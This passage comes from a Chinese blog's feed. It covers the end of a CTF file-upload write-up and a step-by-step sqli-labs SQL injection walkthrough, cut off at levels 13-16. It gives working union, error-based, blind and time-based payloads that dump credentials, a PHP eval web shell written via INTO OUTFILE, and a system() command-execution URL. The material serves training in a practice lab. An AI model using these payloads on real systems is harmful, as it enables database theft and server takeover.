库来创建一张新图片，尺寸为32x32像素。然后它使用一个十六进制数组来循环，并使用红色、绿色和蓝色值来设置图像中的像素。最后将图像保存为”b2.png”，保存在temp目录中。<br>将该图片上传后，访问该图片地址，并且传入以下参数：<br>GET:<br><code>http://eef25c0f-86f4-4cc9-9269-c17440f534c2.challenge.ctf.show/download.php?image=88c1ceb8ad1b0be7870b26ce8f79acc7.png&amp;0=system</code><br>POST:<br><code>1=cat f*</code></p><p>这样便能拿到flag</p><h1 id="web165"><a href="#web165" class="headerlink" title="web165"></a>web165</h1><p>jpg的二次渲染，但我没成功，暂时搁置吧</p><h1 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h1><p>仍然失败，看来需要暂时做点别的换换心情了。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;没啥好说的。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="文件上传" scheme="http://example.com/categories/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="文件上传" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs 1-65</title>
    <link href="http://example.com/2023/01/11/sqli-labs%201-65/"/>
    <id>http://example.com/2023/01/11/sqli-labs%201-65/</id>
    <published>2023-01-10T16:00:00.000Z</published>
    <updated>2023-01-11T09:40:31.515Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次为sqli-labs的合集，为了方便。</p><span id="more"></span><h1 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h1><h2 id="1-2-GET方式的数字型和字符型的联合注入"><a href="#1-2-GET方式的数字型和字符型的联合注入" class="headerlink" title="1-2(GET方式的数字型和字符型的联合注入)"></a>1-2(GET方式的数字型和字符型的联合注入)</h2><ol><li>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1’后是否有<strong>报错提示</strong></li></ol><ul><li>有提示。则存在SQL注入</li><li>无提示。不存在SQL注入<br>（说明：有提示即代表输入的数据带入到了数据库中查询，因此存在注入）<br>只有存在SQL注入才能继续往下执行。<br><img src="/simg/sqli-labs_1.png" alt="sqli-labs_1"></li></ul><ol start="2"><li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>方法是：<br>首先输入：<br> ?id&#x3D;1 and 1&#x3D;2  或  ?id&#x3D;1’–+<br>由于之前我们已经输入过 ?id&#x3D;1’ 出现报错，<br>如果本次输入再次出现报错，说明是 数字型<br>否则即为 字符型</p></li><li><p>猜解SQL查询语句中的<strong>字段数</strong><br>为什么要猜解字段数？<br>因为我们已知存在SQL注入且其类型，可以使用联合查询注入。要使用联合注入首先得知道字段数。<br>（说明：联合查询Union:是把2个sql语句一起查询结果合并，且两张表需要有相同的列数和字段名，使用方式示例如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> A <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> B</span><br></pre></td></tr></table></figure><p>）<br>字段数可以通过order by语句得知。原理是通过order by语句查询，显示正常时是查询列数小于等于总列数。如果报错则该查询列数超过总列数。由此可得知字段数。示例语句如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;order by 3--+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆出显示位</strong><br>所谓爆出显示位，意思是查看分析哪些列是在页面显示的，这有利于我们后续的分析操作。<br>因此我们可以通过如下语句查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,3--+</span><br></pre></td></tr></table></figure><p>（说明：id&#x3D;-1的原因是为了让查询结果完全是union右边的值）</p></li><li><p>获取当前<strong>数据库名和数据库版本号</strong><br>获取数据库名可以执行一些后续操作，获取版本号可以判断哪些数据库操作能做哪些不能做。<br><a href="https://blog.csdn.net/weixin_34678198/article/details/113273999">MYSQL版本简单区别</a><br>因此我们可以通过如下语句查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),version()--+</span><br></pre></td></tr></table></figure><p>这里用到了mysql的系统函数，下面列举5个常用mysql注入系统函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">version()     MySQL版本</span><br><span class="line">user()       数据库用户名</span><br><span class="line">database()   数据库名</span><br><span class="line">@@datadir    数据库路径</span><br><span class="line">@@version_compile_os  操作系统版本</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong><br>首先需要介绍数据库默认库information_schema（5.0以上版本有该库）中的重要表</p></li></ol><ul><li><p>information_schema.schemata<br>schemata表中重要字段为schema_name，此字段涵盖数据库存在的所有库名字，我们可以通过查询语句得知我们想要的数据库都有哪些（database()只可得知当前数据库）<br>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(schema_name),3 from information_schema,schemata</span><br></pre></td></tr></table></figure><p>（说明：group_concat()的作用是将所有结果连接显示成一行）</p></li><li><p>information_schema.tables<br>tables表中重要字段为table_schema（库名）和table_name（表名）。可通过查询语句得到库名或表名，但由于table_schema与表字段table_name一一对应，有大量重复内容。只爆库建议使用schemata库查询<br>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_schema),group_concat(table_name) from information_schema.tables--+</span><br></pre></td></tr></table></figure><p>通过此方法可单独爆出某个数据库内的表名，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema like 0x646F75706870--+</span><br></pre></td></tr></table></figure><p>说明：通过匹配库爆表，需要将库名转换成哈希值或二进制，否则有时候会被转义从而报错</p></li><li><p>information_schema.columns<br>columns表中存在三个重要字段，分别为table_schema（库名字段）、table_name（表名字段）、column_name（字段）<br>可以直接利用这个表对数据库进行爆库爆表操作，只是仍然有很多重复字段，并不建议这么做。</p></li></ul><p>在本关中具体语句即为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure><ol start="7"><li><p><strong>爆字段名</strong><br>通过sql语句查询知道当前数据库有4个表，根据表名知道可能用户的账号和密码是在users表中。因此接下来即为得到该表的字段名和内容。<br>示例语句为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure><p>说明：该语句查询information_schema数据库下的columns表的table_name字段。注意table_name字段在tables表和columns表中均存在。表示所有字段对应的表名。</p></li><li><p><strong>爆数据</strong><br>通过上述操作可知敏感字段username和password，接下来即查询该字段对应的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(username,id,password) from users--+</span><br></pre></td></tr></table></figure></li></ol><h2 id="3-GET方式的字符型的联合注入"><a href="#3-GET方式的字符型的联合注入" class="headerlink" title="3(GET方式的字符型的联合注入)"></a>3(GET方式的字符型的联合注入)</h2><ol><li><p>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1’后是否有<strong>报错提示</strong><br>报错提示为：<br><img src="/simg/sqli-labs_3.png" alt="报错信息"></p></li><li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由此报错信息的关键部分：<br>near ‘’1’’) LIMIT 0,1’ at line 1<br>可知，sql语句是单引号字符型且有括号。<br>所以我们也需要闭合单引号和括号。<br>则构造语句如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2&#x27;)--+</span><br></pre></td></tr></table></figure></li></ol><p>由于之后的思路步骤和第1，2关一样，之后仅放答案。</p><ol start="3"><li>猜解SQL查询语句中的<strong>字段数</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;) order by 3--+</span><br></pre></td></tr></table></figure></li><li><strong>爆出显示位</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,3--+</span><br></pre></td></tr></table></figure></li><li>获取当前<strong>数据库名和数据库版本号</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,database(),version()--+</span><br></pre></td></tr></table></figure></li><li><strong>爆表</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure></li><li><strong>爆字段名</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li><li><strong>爆数据</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure></li></ol><h2 id="4-GET方式的字符型的联合注入"><a href="#4-GET方式的字符型的联合注入" class="headerlink" title="4(GET方式的字符型的联合注入)"></a>4(GET方式的字符型的联合注入)</h2><ol><li><p>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1”后是否有<strong>报错提示</strong><br>报错提示为：<br><img src="/simg/sqli-labs_4.png" alt="报错信息"></p></li><li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由此报错信息的关键部分：<br>near ‘“1””) LIMIT 0,1’ at line 1<br>可知，sql语句是双引号字符型且有括号。<br>所以我们也需要闭合双引号和括号。<br>则构造语句如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2&quot;)--+</span><br></pre></td></tr></table></figure></li></ol><p>由于之后的思路步骤和第1，2关一样，之后仅放答案。</p><ol start="3"><li>猜解SQL查询语句中的<strong>字段数</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;) order by 3--+</span><br></pre></td></tr></table></figure></li><li><strong>爆出显示位</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure></li><li>获取当前<strong>数据库名和数据库版本号</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,database(),version()--+</span><br></pre></td></tr></table></figure></li><li><strong>爆表</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure></li><li><strong>爆字段名</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li><li><strong>爆数据</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure></li></ol><h2 id="5-6-GET方式的报错注入"><a href="#5-6-GET方式的报错注入" class="headerlink" title="5-6(GET方式的报错注入)"></a>5-6(GET方式的报错注入)</h2><ol><li><p>判断是否存在<strong>SQL注入</strong><br>和前几关一致，这里不过多阐述。<br>输入?id&#x3D;1”有报错信息。<br>报错信息为：<br><img src="/simg/sqli-labs_6.png" alt="sqli-labs_6输入?id=1&quot;时的报错信息"></p></li><li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由报错信息near ‘“1”” LIMIT 0,1’ at line 1可知是双引号字符型。<br>构造语句?id&#x3D;1”–+</p></li><li><p>猜解SQL查询语句中的<strong>字段数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;order by 4--+</span><br></pre></td></tr></table></figure><p>可得字段数为3</p></li><li><p>获取当前<strong>数据库名和数据库版本号</strong><br>由于无法返回正常信息，所以不能使用union联合查询<br>使用报错注入常用的函数即可（<a href="https://truthnian.github.io/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/">常用函数</a>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(database(),0x7e,version())),0x23),1)--+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure><p>因为updatexml()函数最多只能显示32个字符，无法显示到所需的数据，所以不能只写where table_name&#x3D;’users’  应该再加一个限定到当前数据库。</p></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1),0x23),1)--+</span><br></pre></td></tr></table></figure><p>因为updatexml()函数最多只能显示32个字符，所需数据可能无法显示完全，因此需要使用limit限制每行显示一组数据。<br><strong>limit</strong>简单解释：<br>limit 3,1  表示返回从第3行起的1行数据，逗号之前的值对应OFFSET，逗号之后的值对应LIMIT。<br>注意：limit第一个被检索的行是第0行，当检索完后不会显示数据</p></li></ol><h2 id="7-GET方式的读写文件"><a href="#7-GET方式的读写文件" class="headerlink" title="7(GET方式的读写文件)"></a>7(GET方式的读写文件)</h2><h4 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h4><ol><li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in…. Use outfile……<br>输入?id&#x3D;1’ 显示：You have an error in your SQL syntax<br>输入?id&#x3D;1’--+  依然报错，说明注入方式不是单纯的单引号<br>输入?id&#x3D;1’’  显示正确，说明是包含了单引号的字符型注入<br>继续不断尝试…<br>最终，输入?id&#x3D;1’))--+  显示正确，注入语句构造成功<br>（说明：这种注入需要不断尝试，并积累经验）</p></li><li><p>猜解SQL查询语句中的<strong>字段数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;order by 4--+</span><br></pre></td></tr></table></figure><p>可得字段数为3</p></li><li><p>获取当前<strong>数据库名和数据库版本号</strong><br>由之前的提示信息Use outfile……可知，<br>这里可以利用outfile的文档来查看回显<br>（说明：</p></li></ol><ul><li>读取文档：load_file()<br>用法：select load_file(‘文件路径’)</li><li>导出文档：into outfile()<br>用法：select ‘string’ into outfile ‘文件路径\\文件名’<br>注意：路径要用双斜线分开）</li></ul><p><strong>但是！</strong><br>在使用文档之前必须要先获得<strong>权限</strong>。</p><ul><li>首先，打开sqli-labs使用的MySQL的my.ini。查找secure_file_priv<br>如果存在，那么修改为secure_file_priv&#x3D;””<br>否则，在[mysqld]下，新增为secure_file_priv&#x3D;””</li><li>然后，找到刚刚修改的MySQL的bin目录，打开管理员权限的cmd，将cmd的位置转到bin目录下，输入以下指令：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">输入该数据库root用户密码</span><br><span class="line">show variables like &quot;%secure%&quot;;</span><br></pre></td></tr></table></figure>secure_file_priv 一栏的value为空，即是成功</li></ul><p>之后就能愉快地获取库名和版本号了,示例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;))union select 1,database(),version() into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\database.txt&quot;--+</span><br></pre></td></tr></table></figure><ol start="4"><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;)) UNION SELECT user(),version(),(select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot; ) into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\table.txt&quot; --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;)) UNION SELECT user(),version(),(select group_concat(column_name) from information_schema.columns where table_schema=&quot;security&quot; and table_name=&quot;users&quot; ) into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\columns.txt&quot; --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;))  UNION SELECT user(),version(),(select group_concat(username,0x23,password) from users) into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\datas.txt&quot; --+</span><br></pre></td></tr></table></figure></li></ol><h4 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h4><p>和第一种的前3步到获得修改文件权限的位置都是一样的。<br>之后是采用<strong>一句话木马</strong>的形式。<br>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;)) union select 1,&quot;&lt;?php @eval($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;,3 into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\2.txt&quot; --+</span><br></pre></td></tr></table></figure><h2 id="8-GET方式的布尔盲注"><a href="#8-GET方式的布尔盲注" class="headerlink" title="8(GET方式的布尔盲注)"></a>8(GET方式的布尔盲注)</h2><ol><li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in………..<br>输入?id&#x3D;1’ 无任何显示，说明是错误的<br>输入?id&#x3D;1’’  显示：You are in………..<br>输入?id&#x3D;1’--+  显示：You are in………..<br>说明构造成功，且是单引号字符型</p></li><li><p>获取当前<strong>数据库名和数据库版本号</strong></p></li></ol><ul><li>由于无法显示报错信息，我们需要使用length()函数首先判断数据库名长度<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and length(database())&gt;7--+  返回正确</span><br><span class="line">?id=1&#x27;and length(database())&gt;8--+  返回错误</span><br></pre></td></tr></table></figure>说明数据库名长度为8</li><li>接下来便是一个个判断字符，这里可以使用substr(),mid(),substring(),ord(),ascii()等，选择比较多，任意选取即可<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr(database(),1,1))&gt;114--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr(database(),1,1))&gt;115--+   返回错误</span><br></pre></td></tr></table></figure>说明数据库名第1个字符是s，以此类推，可得数据库名为security<br>数据库版本号也是同理</li></ul><ol start="3"><li><p><strong>爆表</strong><br>道理是类似的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&lt;102--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&lt;101--+   返回错误</span><br></pre></td></tr></table></figure><p>说明第一个表名的第1个字符是e，以此类推，可以得到所有表名，最终我们发现关键的表名users<br>这里使用limit的原因是因为一个数据库名中表名很可能不止一个，我们需要依次查询</p></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;106--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;105--+   返回错误</span><br></pre></td></tr></table></figure><p>说明第一个字段名是i，以此类推，可以得到所有字段名，最终我们发现关键的字段名username,password</p></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select username from users limit 0,1),1,1))&gt;67--+  返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select username from users limit 0,1),1,1))&gt;68--+  返回错误</span><br></pre></td></tr></table></figure><p>说明第一个用户名是D，以此类推，可以得到所有用户名和密码。</p></li></ol><h2 id="9-10-GET方式的时间盲注"><a href="#9-10-GET方式的时间盲注" class="headerlink" title="9-10(GET方式的时间盲注)"></a>9-10(GET方式的时间盲注)</h2><ol><li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in………..<br>输入?id&#x3D;1’ 显示：You are in………..<br>输入?id&#x3D;1” 显示：You are in………..<br>此时我们应该发现端倪，页面可能不会返回任何信息<br>输入?id&#x3D;1 and sleep(5)--+  页面迅速显示<br>输入?id&#x3D;1’and sleep(5)--+  页面延迟了5s，说明的确是应当使用时间盲注<br>输入?id&#x3D;1’’and sleep(5)--+  页面迅速显示<br>说明是单引号字符型注入</p></li><li><p>获取当前<strong>数据库名和数据库版本号</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select database()))&gt;7,sleep(5),1)--+    页面迅速显示</span><br><span class="line">?id=1&#x27;and if(length((select database()))&gt;8,sleep(5),1)--+    页面延迟了5s</span><br></pre></td></tr></table></figure><p>说明数据库名长度是8个字符<br>版本号以此类推</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))&gt;115,sleep(5),1)--+   页面迅速显示</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))&gt;114,sleep(5),1)--+   页面延迟了5s</span><br></pre></td></tr></table></figure><p>最终尝试完后可得数据库名是security</p></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</span><br><span class="line">如此判断所有表名长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">再逐一判断表名</span><br></pre></td></tr></table></figure><p>最终尝试完后可得所需表名为users</p></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20,sleep(5),1)--+</span><br><span class="line">判断所有字段名的长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断字段名</span><br></pre></td></tr></table></figure><p>最终出现了我们所需的字段名username, password</p></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+</span><br><span class="line">判断字段内容长度</span><br><span class="line">?id=1&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span><br><span class="line">逐一检测内容</span><br></pre></td></tr></table></figure><p>最终得到了所需的数据</p></li></ol><ul><li>第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号</li></ul><h2 id="11-12-POST方式的字符型的联合注入"><a href="#11-12-POST方式的字符型的联合注入" class="headerlink" title="11-12(POST方式的字符型的联合注入)"></a>11-12(POST方式的字符型的联合注入)</h2><ol><li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>猜解方式和之前差不多。这里稍微使用点和之前不一样的方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1 #   万能密码构造成功，返回账户和密码</span><br></pre></td></tr></table></figure><p>说明：这里的注释要使用#，之前的--+不再适用</p></li><li><p>猜解SQL查询语句中的<strong>字段数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 2 #   返回正确信息</span><br><span class="line">1&#x27; order by 3 #   返回错误信息</span><br></pre></td></tr></table></figure><p>说明字段数为2</p></li><li><p>获取当前<strong>数据库名和数据库版本号</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select database(),version() #   返回Your Login name:security  Your Password:5.7.26</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; #</span><br><span class="line">返回emails,referers,uagents,users</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; #</span><br><span class="line">返回id,username,password</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password) from users #  返回用户名和密码</span><br></pre></td></tr></table></figure></li></ol><ul><li>第12关和第11关差不多，只是要用1”) or 1&#x3D;1 #</li></ul><h2 id="13-16-POST方式的时间盲注"><a href="#13-16-POST方式的时间盲注" class="headerlink" 